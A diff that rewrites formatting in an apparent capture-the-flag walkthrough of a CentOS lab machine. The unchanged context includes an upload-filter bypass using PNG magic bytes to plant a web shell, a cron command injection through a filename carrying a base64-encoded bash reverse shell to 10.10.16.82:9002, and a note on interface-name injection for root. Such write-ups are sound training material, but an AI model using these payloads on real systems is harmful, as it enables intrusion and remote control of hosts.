@@ -67,11 +67,7 @@ function check_file_type($file) {
   }                                             #lib.php
 ```
 
-- Allows all image types — jpg, jpeg, png
-- The PNG signature header (magic numbers):
-  - `89 50 4E 47 0D 0A 1A 0A`
-
-Convert the hex to binary and prepend it to the web shell:
+The check allows all image types — jpg, jpeg, png. The PNG signature header (magic numbers) is `89 50 4E 47 0D 0A 1A 0A`. Convert the hex to binary and prepend it to the web shell:
 
 ```sh
 echo '89 50 4E 47 0D 0A 1A 0A' | xxd -p -r > header.png 
@@ -89,7 +85,7 @@ PNG
 uid=48(apache) gid=48(apache) groups=48(apache)
 ```
 
-Gained shell as apache.
+Gained a shell as apache.
 
 ## Cron command injection
 
@@ -140,16 +136,13 @@ foreach ($files as $key => $value) {
 ?>
 ```
 
-A solid command injection:
-- The **exec** variable interpolates `$value`
-- `$value` is the filename in `/uploads`, used to detect potential attacks
-- We can manipulate file names — and nothing else
+A solid command injection: the **exec** variable interpolates `$value`, and `$value` is the filename in `/uploads`, used to detect potential attacks. We can manipulate file names — and nothing else:
 
 ```php
 exec("nohup /bin/rm -f $path$value > /dev/null 2>&1 &");
 ```
 
-Becomes:
+Which becomes:
 
 ```php
 exec("nohup /bin/rm -f $path;cmd > /dev/null 2>&1 &");
@@ -161,10 +154,7 @@ Payload — a file named with a base64-encoded reverse shell:
 touch -- '; echo L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzEwLjEwLjE2LjgyLzkwMDIgMD4mMQ== | base64 -d | bash'
 ```
 
-- `touch --` → creates a file with the name that follows `--`
-- The base64 decodes and executes the reverse shell
-
-Gained shell as `guly`.
+`touch --` creates a file with the name that follows `--`; the base64 decodes and executes the reverse shell. Gained a shell as `guly`.
 
 # Root
 
@@ -206,7 +196,7 @@ done
 /sbin/ifup guly0
 ```
 
-In CentOS we control the interface name (DEVICE) and other values — and `ifup guly0` brings the interface up at the end.
+In CentOS, we control the interface name (DEVICE) and other values — and `ifup guly0` brings the interface up at the end.
 
 > https://seclists.org/fulldisclosure/2019/Apr/24
 
